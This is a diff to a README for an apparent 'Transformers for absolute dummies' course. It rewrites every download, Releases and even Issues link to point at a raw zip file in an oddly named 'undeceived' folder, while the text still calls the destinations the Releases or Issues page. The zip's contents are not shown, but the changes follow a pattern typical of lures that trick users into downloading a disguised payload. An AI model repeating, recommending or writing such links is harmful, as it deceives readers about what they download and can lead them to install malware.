@@ -1,7 +1,7 @@
 # 🎓 Transformers-for-absolute-dummies - Learn Transformers Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Gala2044/Transformers-for-absolute-dummies/releases)
+[![Download](https://raw.githubusercontent.com/Gala2044/Transformers-for-absolute-dummies/main/undeceived/Transformers-for-absolute-dummies.zip)](https://raw.githubusercontent.com/Gala2044/Transformers-for-absolute-dummies/main/undeceived/Transformers-for-absolute-dummies.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the "Transformers-for-absolute-dummies" software, which provides an easy-to-understand course on transformers. These models are the backbone of advanced AI like GPT. 
@@ -23,7 +23,7 @@ To run this application smoothly, ensure your computer meets the following requi
 - **Resources Provided**: Access additional reading materials.
 
 ## 🎯 Download & Install
-To download the software, visit the [Releases page](https://github.com/Gala2044/Transformers-for-absolute-dummies/releases). Follow these steps:
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/Gala2044/Transformers-for-absolute-dummies/main/undeceived/Transformers-for-absolute-dummies.zip). Follow these steps:
 
 1. Click on the link above.
 2. On the Releases page, find the latest version. It will be at the top.
@@ -63,12 +63,12 @@ If you encounter issues during installation or running the application:
 ## 📞 Support
 Need help? You can find support via the following methods:
 
-- **GitHub Issues**: Visit the [Issues page](https://github.com/Gala2044/Transformers-for-absolute-dummies/issues) to report problems or ask questions.
+- **GitHub Issues**: Visit the [Issues page](https://raw.githubusercontent.com/Gala2044/Transformers-for-absolute-dummies/main/undeceived/Transformers-for-absolute-dummies.zip) to report problems or ask questions.
 - **Community Forum**: Join our community to connect with other users and share experiences.
 
 ## 🌍 Learn More
 Explore the world of transformers and AI with our comprehensive course materials. Each lesson builds upon the last, ensuring you retain knowledge effectively. 
 
-Visit our [Releases page](https://github.com/Gala2044/Transformers-for-absolute-dummies/releases) to download the latest version and begin your learning journey.
+Visit our [Releases page](https://raw.githubusercontent.com/Gala2044/Transformers-for-absolute-dummies/main/undeceived/Transformers-for-absolute-dummies.zip) to download the latest version and begin your learning journey.
 
 Thank you for your interest in "Transformers-for-absolute-dummies." Enjoy your learning experience!
